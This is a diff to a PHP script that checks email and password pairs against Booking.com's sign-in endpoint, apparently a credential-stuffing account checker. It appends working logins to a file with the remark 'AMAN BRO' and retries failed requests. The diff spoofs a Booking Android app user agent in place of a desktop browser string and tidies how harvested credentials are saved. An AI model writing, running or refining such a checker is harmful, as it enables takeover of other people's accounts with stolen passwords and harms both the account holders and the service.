@@ -32,7 +32,7 @@ class curl {
                 break;
         }
         curl_setopt($this->ch, CURLOPT_URL, $url);
-        curl_setopt($this->ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0');
+        curl_setopt($this->ch, CURLOPT_USERAGENT, 'Booking.App/22.9 Android/9; Type: mobile; AppStore: google; Brand: xiaomi; Model: Redmi Note 8;');
         curl_setopt($this->ch, CURLOPT_HEADER, false);
         curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header);
         curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
@@ -67,10 +67,8 @@ class bookingcom extends curl{
     function check($email, $password, $client_id) { 
 
         $method   = 'POST';
-
         $header[] = 'Content-Type: application/json';
         $header[] = 'X-Requested-With: XMLHttpRequest';
-
         $endpoint = 'https://account.booking.com/account/sign-in/password';
         
         $param = '{
@@ -97,7 +95,7 @@ class bookingcom extends curl{
             }
 
             $fh = fopen($file, "a");
-            fwrite($fh, $email.";".$password);
+            fwrite($fh, $email.";".$password."\n");
             fclose($fh);
 
             return $email.". AMAN BRO\n";
@@ -107,7 +105,7 @@ class bookingcom extends curl{
         } elseif ($json->errors[0] == 1203) {
             return $email." SALAH PASSWORD\n"; 
         } else {
-            echo "[!] UNKNOWN ERROR: ".$check."\n"; 
+            echo "[!] UNKNOWN ERROR\n"; 
             sleep(2);
             goto retry;
         }       
